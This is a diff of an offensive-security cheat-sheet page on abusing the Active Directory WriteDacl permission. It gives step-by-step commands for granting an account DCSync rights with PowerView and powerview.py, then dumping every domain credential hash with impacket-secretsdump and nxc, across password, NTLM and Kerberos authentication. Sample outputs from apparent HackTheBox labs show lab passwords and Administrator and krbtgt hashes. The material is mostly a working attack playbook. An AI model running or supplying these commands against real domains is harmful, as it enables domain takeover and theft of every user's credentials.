@@ -1,9 +1,11 @@
 ---
 title: "WriteDacl"
-tags: ["Writedacl", "Dcsync", "Powerview", "Credential Dumping", "Active Directory", "Windows"]
+tags: ["Active Directory", "WriteDacl", "Credential Dumping", "Dcsync", "Powerview", "Windows", "Writedacl"]
 ---
 
-### Abuse #1: Add DCsync Right to User
+{{< filter_buttons >}}
+
+### Add DCsync Right to User
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
@@ -11,22 +13,61 @@ tags: ["Writedacl", "Dcsync", "Powerview", "Credential Dumping", "Active Directo
 {{< tab set1-1 tab1 active >}}powerview.py{{< /tab >}}
 {{< tabcontent set1-1 tab1 >}}
 
-#### 1. Connect to DC
+#### 1. Connect
 
-```console
-# With password
-powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
-```
-
-```console
-# With hash
-powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H <HASH>
+```console {class="password"}
+# Password
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
 ```
 
 ```console {class="sample-code"}
-$ powerview 'CORP.LOCAL/WEB01$@172.16.1.5' -H 7ddf32e17a6ac5ce04a8ecbf782ca509
-(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
-PV > 
+$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb'
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ntlm"}
+# NTLM
+powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>'
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc'
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb' -k
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+powerview '<DOMAIN>/<USER>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -k --no-pass
+╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
+╰─PV ❯ 
 ```
 
 #### 2. Add DCsync Right
@@ -46,6 +87,9 @@ PV > Add-DomainObjectAcl -PrincipalIdentity 'WEB01$' -TargetIdentity 'DC=corp,DC
 {{< /tabcontent >}}
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
+{{< tab set1-2 tab1 active >}}powerview{{< /tab >}}
+{{< tabcontent set1-2 tab1 >}}
+
 
 #### 1. Import PowerView
 
@@ -57,30 +101,17 @@ PV > Add-DomainObjectAcl -PrincipalIdentity 'WEB01$' -TargetIdentity 'DC=corp,DC
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
 ```
 
-#### 2. Create a Cred Object (Runas) \[Optional\]
+#### 2. Add DCsync Right
 
 ```console
-$username = '<DOMAIN>\<USER>'
-```
-
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 3. Add DCsync Right
-
-```console
-Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync -Credential $cred
+Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync -Credential $Cred
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
 
+{{< /tabcontent >}}
 {{< /tabcontent >}}
 
 #### Secrets Dump
@@ -89,41 +120,126 @@ Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTIT
 {{< tab set2 tab2 >}}nxc{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
-```console
-impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
+```console {class="password"}
+# Password
+impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
 ```
 
 ```console {class="sample-code"}
-$ impacket-secretsdump 'svc-alfresco:s3rvice@10.10.10.161'
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
 ---[SNIP]---
-[*] Cleaning up...
+```
+
+```console {class="ntlm"}
+# NTLM
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH>
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb' -k
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] CCache file is not found. Skipping...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945 -k
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] CCache file is not found. Skipping...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -k -no-pass
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
 
-```console
-nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
+```console {class="password"}
+# Password
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --ntds
 ```
 
-```console {class="sample-code"}
-$ nxc smb 172.16.1.5 -d CORP.LOCAL -u 'WEB01$' -H 7ddf32e17a6ac5ce04a8ecbf782ca509 --ntds
-[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
-SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)
-SMB         172.16.1.5      445    DC01             [+] CORP.LOCAL\WEB01$:7ddf32e17a6ac5ce04a8ecbf782ca509
-SMB         172.16.1.5      445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
-SMB         172.16.1.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
-SMB         172.16.1.5      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
----[SNIP]---
+```console {class="ntlm"}
+# NTLM
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' --ntds
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --kdcHost <DC> --ntds
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --kdcHost <DC> --ntds
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -k --kdcHost <DC> --use-kcache --ntds
 ```
 
 {{< /tabcontent >}}
